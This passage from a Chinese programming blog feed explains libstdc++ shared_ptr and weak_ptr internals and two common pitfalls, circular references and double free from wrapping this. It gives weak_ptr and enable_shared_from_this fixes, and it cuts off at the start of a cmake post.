资源管理父类指针--多态</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见先是对资源管理指针进行值拷贝，这里也就说明了当多个shared_ptr指向同一块资源时，他们之间只有一份共享资源管理对象；</p><p>如果是用shared_ptr进行拷贝，将use_count引用计数加1。</p><p>如果是用weak_ptr进行拷贝，此时就是weak_ptr调用lock()时，也会将use_count引用计数加1，并且会判断加之前是否为0，如果是则抛出异常。</p><h4 id="d-gt-reset函数实现"><a href="#d-gt-reset函数实现" class="headerlink" title="d&gt; reset函数实现"></a>d&gt; reset函数实现</h4><p>关键代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// reset()函数实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span> <span class="hljs-comment">// never throws</span></span><br><span class="hljs-function"></span>&#123; __shared_ptr().<span class="hljs-built_in">swap</span>(*<span class="hljs-keyword">this</span>); &#125;<br><span class="hljs-comment">// 交换指针函数实现</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(__shared_ptr&lt;_Tp, _Lp&gt;&amp; __other)</span> <span class="hljs-comment">// never throws</span></span><br><span class="hljs-function"></span>&#123;<br>    std::<span class="hljs-built_in">swap</span>(_M_ptr, __other._M_ptr);<br>    _M_refcount._M_swap(__other._M_refcount);<br>&#125;<br><span class="hljs-comment">// reset有参函数实现</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">(_Tp1* __p)</span> <span class="hljs-comment">// _Tp1 must be complete.</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Catch self-reset errors.</span><br>    _GLIBCXX_DEBUG_ASSERT(__p == <span class="hljs-number">0</span> || __p != _M_ptr); <br>    __shared_ptr(__p).<span class="hljs-built_in">swap</span>(*<span class="hljs-keyword">this</span>);<br>&#125;<br><span class="hljs-comment">// reset有参函数实现</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1, <span class="hljs-keyword">typename</span> _Deleter&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">(_Tp1* __p, _Deleter __d)</span></span><br><span class="hljs-function"></span>&#123; __shared_ptr(__p, __d).<span class="hljs-built_in">swap</span>(*<span class="hljs-keyword">this</span>); &#125;<br></code></pre></td></tr></table></figure><p>这里的实现很巧妙，根据参数不同原地构造不同的局部对象，使用swap交换指针所指向的内容，交换后新构造出来的对象变为要销毁的对象，在函数结束时自动调用析构函数完成销毁，充分体现了RAII思想。</p><h3 id="2-3-3-weak-ptr分析"><a href="#2-3-3-weak-ptr分析" class="headerlink" title="2.3.3 weak_ptr分析"></a>2.3.3 weak_ptr分析</h3><h4 id="a-gt-初始化过程-1"><a href="#a-gt-初始化过程-1" class="headerlink" title="a&gt; 初始化过程"></a>a&gt; 初始化过程</h4><p>__weak_ptr的构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, _Lock_policy _Lp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_ptr</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> _Tp element_type;<br><span class="hljs-comment">// 无参构造函数      </span><br>    __weak_ptr()<br>       : _M_ptr(<span class="hljs-number">0</span>), _M_refcount() <span class="hljs-comment">// never throws </span><br>&#123; &#125;<br><span class="hljs-keyword">private</span>:<br>    _Tp*        _M_ptr;               <span class="hljs-comment">// 资源指针</span><br>    __weak_count&lt;_Lp&gt;  _M_refcount;    <span class="hljs-comment">// 资源管理对象</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>weak_ptr只能默认初始化，过程很简单，weak_count中的无参构造函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;_Lock_policy _Lp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_count</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// 无参构造函数</span><br>    __weak_count()<br>      : _M_pi(<span class="hljs-number">0</span>) <span class="hljs-comment">// nothrow</span><br>    &#123; &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_count</span>&lt;_Lp&gt;;<br>    _Sp_counted_base&lt;_Lp&gt;*  _M_pi;<span class="hljs-comment">// 资源管理父类指针</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见将指针赋值为0，基本上什么也没做，其实这种用法不常见，最常见的还是绑定到shared_ptr指针上，也就是调用拷贝构造函数。</p><h4 id="b-gt-拷贝过程分析"><a href="#b-gt-拷贝过程分析" class="headerlink" title="b&gt; 拷贝过程分析"></a>b&gt; 拷贝过程分析</h4><p>__weak_ptr的拷贝控制成员如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, _Lock_policy _Lp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">__weak_ptr</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> _Tp element_type;<br><span class="hljs-comment">// weak_ptr拷贝构造函数</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __weak_ptr(<span class="hljs-type">const</span> __weak_ptr&lt;_Tp1, _Lp&gt;&amp; __r)<br>: _M_refcount(__r._M_refcount) <span class="hljs-comment">// never throws</span><br>        &#123;<br>  __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;)<br>  _M_ptr = __r.<span class="hljs-built_in">lock</span>().<span class="hljs-built_in">get</span>();<br>&#125;<br><span class="hljs-comment">// shared_ptr拷贝构造函数</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __weak_ptr(<span class="hljs-type">const</span> __shared_ptr&lt;_Tp1, _Lp&gt;&amp; __r)<br>: _M_ptr(__r._M_ptr), _M_refcount(__r._M_refcount) <span class="hljs-comment">// never throws</span><br>        &#123; __glibcxx_function_requires(_ConvertibleConcept&lt;_Tp1*, _Tp*&gt;) &#125;<br><span class="hljs-comment">// weak_ptr赋值运算符重载</span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __weak_ptr&amp;<br>        <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> __weak_ptr&lt;_Tp1, _Lp&gt;&amp; __r) <span class="hljs-comment">// never throws</span><br>        &#123;<br>  _M_ptr = __r.<span class="hljs-built_in">lock</span>().<span class="hljs-built_in">get</span>();<br>  _M_refcount = __r._M_refcount;<br>  <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-comment">// shared_ptr赋值运算符重载      </span><br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>        __weak_ptr&amp;<br>        <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> __shared_ptr&lt;_Tp1, _Lp&gt;&amp; __r) <span class="hljs-comment">// never throws</span><br>        &#123;<br>  _M_ptr = __r._M_ptr;<br>  _M_refcount = __r._M_refcount;<br>  <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br>    _Tp*        _M_ptr;               <span class="hljs-comment">// 资源指针</span><br>    __weak_count&lt;_Lp&gt;  _M_refcount;    <span class="hljs-comment">// 资源管理对象</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看见可以使用使用shared_ptr和weak_ptr两种指针进行拷贝初始化和拷贝赋值。</p><p>这里只讨论使用shared_ptr初始化weak_ptr，会调用__weak_count&lt;_Lp&gt;类的shared版本的拷贝构造函数，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// shared_count拷贝构造函数  </span><br>__weak_count(<span class="hljs-type">const</span> __shared_count&lt;_Lp&gt;&amp; __r)<br>    : _M_pi(__r._M_pi) <span class="hljs-comment">// nothrow</span><br>&#123;<br><span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>  _M_pi-&gt;_M_weak_add_ref();<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      _M_weak_add_ref() // nothrow</span><br><span class="hljs-comment">      &#123; __gnu_cxx::__atomic_add_dispatch(&amp;_M_weak_count, 1); &#125;</span><br><span class="hljs-comment">      */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看见会将资源管理对象的指针直接给weak_count，再将_M_weak_count引用计数加1。可以得到结论：weak_ptr绑定shared_ptr不会影响资源引用计数，weak_ptr和shared_ptr共用一份资源管理对象。weak_ptr与shared_ptr内部结构类似，如图所示：</p><p><img src="/2022/12/21/raii-yu-zhi-neng-zhi-zhen/image-20221222155104758.png" alt="weak_ptr类布局"></p><h4 id="c-gt-销毁过程分析"><a href="#c-gt-销毁过程分析" class="headerlink" title="c&gt; 销毁过程分析"></a>c&gt; 销毁过程分析</h4><p>_weak_count析构函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 析构函数      </span><br>~__weak_count() <span class="hljs-comment">// nothrow</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (_M_pi != <span class="hljs-number">0</span>)<br>  _M_pi-&gt;_M_weak_release();<br>&#125;<br></code></pre></td></tr></table></figure><p>_Sp_counted_base类中的_M_weak_release()代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++">_M_weak_release() <span class="hljs-comment">// nothrow</span><br>&#123;<br>    <span class="hljs-comment">// Be race-detector-friendly. For more info see bits/c++config.</span><br>    _GLIBCXX_SYNCHRONIZATION_HAPPENS_BEFORE(&amp;_M_weak_count);<br>    <span class="hljs-comment">// _M_weak_count-- == 1</span><br>    <span class="hljs-keyword">if</span> (__gnu_cxx::__exchange_and_add_dispatch(&amp;_M_weak_count, <span class="hljs-number">-1</span>) == <span class="hljs-number">1</span>)<br>    &#123;<br>        _GLIBCXX_SYNCHRONIZATION_HAPPENS_AFTER(&amp;_M_weak_count);<br>        <span class="hljs-keyword">if</span> (_Mutex_base&lt;_Lp&gt;::_S_need_barriers)<br>        &#123;<br>            <span class="hljs-comment">// See _M_release(),</span><br>            <span class="hljs-comment">// destroy() must observe results of dispose()</span><br>            __atomic_thread_fence (__ATOMIC_ACQ_REL);<br>        &#125;<br>        _M_destroy();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        virtual void _M_destroy() // nothrow</span><br><span class="hljs-comment">        &#123; delete this; &#125;</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看见weak_ptr的销毁过程只递减了_M_weak_count引用计数，并判断决定是否销毁资源管理对象。</p><h4 id="d-gt-lock函数实现"><a href="#d-gt-lock函数实现" class="headerlink" title="d&gt; lock函数实现"></a>d&gt; lock函数实现</h4><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">__shared_ptr&lt;_Tp, _Lp&gt; <span class="hljs-title">lock</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> <span class="hljs-comment">// never throws</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __GTHREADS</span><br><span class="hljs-comment">// 通过_M_use计数是否为0判断weak_ptr是否有效</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">expired</span>())<br>  <span class="hljs-keyword">return</span> __shared_ptr&lt;element_type, _Lp&gt;();<br>__try<br>  &#123;<br>        <span class="hljs-comment">// 强制类型转换</span><br>    <span class="hljs-keyword">return</span> __shared_ptr&lt;element_type, _Lp&gt;(*<span class="hljs-keyword">this</span>);<br>  &#125;<br>__catch(<span class="hljs-type">const</span> bad_weak_ptr&amp;)<br>  &#123;<br>    <span class="hljs-comment">// Q: How can we get here?</span><br>    <span class="hljs-comment">// A: Another thread may have invalidated r after the</span><br>    <span class="hljs-comment">//    use_count test above.</span><br>  <span class="hljs-keyword">return</span> __shared_ptr&lt;element_type, _Lp&gt;();<br>&#125;<br></code></pre></td></tr></table></figure><p>原理就是调用shared_ptr可以接受weak_ptr版本的拷贝构造函数来初始化一个shared_ptr返回，并且会造成_M_use_count引用计数加1。</p><h2 id="2-4-shared指针问题"><a href="#2-4-shared指针问题" class="headerlink" title="2.4 shared指针问题"></a>2.4 shared指针问题</h2><h3 id="2-4-1-循环引用"><a href="#2-4-1-循环引用" class="headerlink" title="2.4.1 循环引用"></a>2.4.1 循环引用</h3><h4 id="a-gt-错误示例"><a href="#a-gt-错误示例" class="headerlink" title="a&gt; 错误示例"></a>a&gt; 错误示例</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">C</span> &#123;<br>std::shared_ptr&lt;C&gt; m_child;<br>std::shared_ptr&lt;C&gt; m_parent;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> parent = std::<span class="hljs-built_in">make_shared</span>&lt;C&gt;();<br>    <span class="hljs-keyword">auto</span> child = std::<span class="hljs-built_in">make_shared</span>&lt;C&gt;();<br>    <br>    <span class="hljs-comment">// 建立互相引用</span><br>    parent-&gt;m_child = child;<br>    child-&gt;m_parent = parent;<br>    <br>    <span class="hljs-comment">// 尝试释放</span><br>    parent.<span class="hljs-built_in">reset</span>();<br>    child.<span class="hljs-built_in">reset</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码parent和child指针都不会被释放，在释放parent时，存在child指向，释放child时，存在parent指向。</p><h4 id="b-gt-解决办法"><a href="#b-gt-解决办法" class="headerlink" title="b&gt; 解决办法"></a>b&gt; 解决办法</h4><p>将结构C其中一个shared_ptr改为weak_ptr</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">C</span> &#123;<br>std::shared_ptr&lt;C&gt; m_child;<br>std::weak_ptr&lt;C&gt; m_parent;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> parent = std::<span class="hljs-built_in">make_shared</span>&lt;C&gt;();<br>    <span class="hljs-keyword">auto</span> child = std::<span class="hljs-built_in">make_shared</span>&lt;C&gt;();<br>    <br>    <span class="hljs-comment">// 建立互相引用</span><br>    parent-&gt;m_child = child;<br>    child-&gt;m_parent = parent;<br>    <br>    <span class="hljs-comment">// 尝试释放，必须先释放parent，才能将child引用计数降到1</span><br>    parent.<span class="hljs-built_in">reset</span>();<span class="hljs-comment">// parent可以被释放，因为child中指向它的是弱引用，不会增加引用计数</span><br>    child.<span class="hljs-built_in">reset</span>();<span class="hljs-comment">// child可以被释放，因为parent中指向它的已经被释放了</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-2-this问题"><a href="#2-4-2-this问题" class="headerlink" title="2.4.2 this问题"></a>2.4.2 this问题</h3><p>shared_ptr能够安全管理资源的一个前提是，多个共享资源的shared_ptr所使用的资源管理对象是同一个。如果不是同一个，在销毁时会对同一份资源进行double free。</p><h4 id="a-gt-错误示例-1"><a href="#a-gt-错误示例-1" class="headerlink" title="a&gt; 错误示例"></a>a&gt; 错误示例</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Thing</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">modify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-function">std::shared_ptr&lt;Thing&gt; <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>;<br>        <span class="hljs-comment">// first free</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;begin&quot;</span> &lt;&lt; std::endl;<br>    &#123;<br>        <span class="hljs-function">std::shared_ptr&lt;Thing&gt; <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Thing)</span></span>;<br>        p1-&gt;<span class="hljs-built_in">modify</span>();<br>        <span class="hljs-comment">// double free</span><br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;end&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/2022/12/21/raii-yu-zhi-neng-zhi-zhen/image-20221222173040427.png" alt="double free"></p><p>代码会出现双重释放错误，在资源内部使用资源自身this初始化shared_ptr会在shared_ptr的构造函数中使用new重新申请一个资源管理对象。此时两个不同的资源管理对象同时管理一份资源，所以会造成对同一资源的二次释放错误。</p><h4 id="b-gt-解决办法-1"><a href="#b-gt-解决办法-1" class="headerlink" title="b&gt; 解决办法"></a>b&gt; 解决办法</h4><p>C++引入了enable_shared_from_this类来解决这个问题，关键代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">enable_shared_from_this</span><br>&#123;<br><span class="hljs-keyword">protected</span>:<br>      <span class="hljs-built_in">enable_shared_from_this</span>() &#123; &#125;<br>      <span class="hljs-built_in">enable_shared_from_this</span>(<span class="hljs-type">const</span> enable_shared_from_this&amp;) &#123; &#125;<br>      enable_shared_from_this&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> enable_shared_from_this&amp;)<br>      &#123; <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>; <br>      ~<span class="hljs-built_in">enable_shared_from_this</span>() &#123; &#125;<br><span class="hljs-keyword">public</span>:<br>      <span class="hljs-function">shared_ptr&lt;_Tp&gt; <span class="hljs-title">shared_from_this</span><span class="hljs-params">()</span></span><br><span class="hljs-function">      </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">shared_ptr</span>&lt;_Tp&gt;(<span class="hljs-keyword">this</span>-&gt;_M_weak_this); &#125;<br>      <span class="hljs-function">shared_ptr&lt;<span class="hljs-type">const</span> _Tp&gt; <span class="hljs-title">shared_from_this</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function">      </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-type">const</span> _Tp&gt;(<span class="hljs-keyword">this</span>-&gt;_M_weak_this); &#125;<br><span class="hljs-keyword">private</span>:<br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>      <span class="hljs-type">void</span> _M_weak_assign(_Tp1* __p, <span class="hljs-type">const</span> __shared_count&lt;&gt;&amp; __n) <span class="hljs-type">const</span><br>      &#123; _M_weak_this._M_assign(__p, __n); &#125;<br>      <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp1&gt;<br>      <span class="hljs-comment">// _shared_ptr的构造函数中被调用</span><br>      <span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> __enable_shared_from_this_helper(<span class="hljs-type">const</span> __shared_count&lt;&gt;&amp; __pn,<br> <span class="hljs-type">const</span> enable_shared_from_this* __pe,<br> <span class="hljs-type">const</span> _Tp1* __px)<br>      &#123;<br>      <span class="hljs-keyword">if</span> (__pe != <span class="hljs-number">0</span>)<br>      __pe-&gt;_M_weak_assign(<span class="hljs-built_in">const_cast</span>&lt;_Tp1*&gt;(__px), __pn);<br>  &#125;<br><br>      <span class="hljs-keyword">mutable</span> weak_ptr&lt;_Tp&gt;  _M_weak_this;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要让出现问题的Thing类继承自enable_shared_from_this即可在内部维护一个weak_ptr，需要使用指针时，只需要调用shared_from_this()成员即可。修改后的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Thing</span> <br>    : <span class="hljs-keyword">public</span> std::enable_shared_from_this&lt;Thing&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">modify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-function">std::shared_ptr&lt;Thing&gt; <span class="hljs-title">p2</span><span class="hljs-params">(shared_from_this())</span></span>;<br>        <span class="hljs-comment">// first free</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;begin&quot;</span> &lt;&lt; std::endl;<br>    &#123;<br>        <span class="hljs-function">std::shared_ptr&lt;Thing&gt; <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Thing)</span></span>;<br>        p1-&gt;<span class="hljs-built_in">modify</span>();<br>        <span class="hljs-comment">// double free</span><br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;end&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmake基础</title>
      <link href="/2022/12/06/cmake-ji-chu/"/>
      <url>/2022/12/06/cmake-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="1-C-工程结构"><a href="#1-C-工程结构" class="headerlink" title="1.C++工程结构"></a>1.C++工程结构</h1><p>参考：<a href="https://api.csswg.org/bikeshed/?force=1&url=https://raw.githubusercontent.com/vector-of-bool/pitchfork/develop/data/spec.bs">cxx-pflR1: The Pitchfork Layout (PFL) (csswg.org)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">.<br>├── 3rdparty-- 所有的第三方库目录<br>│   ├── external-- 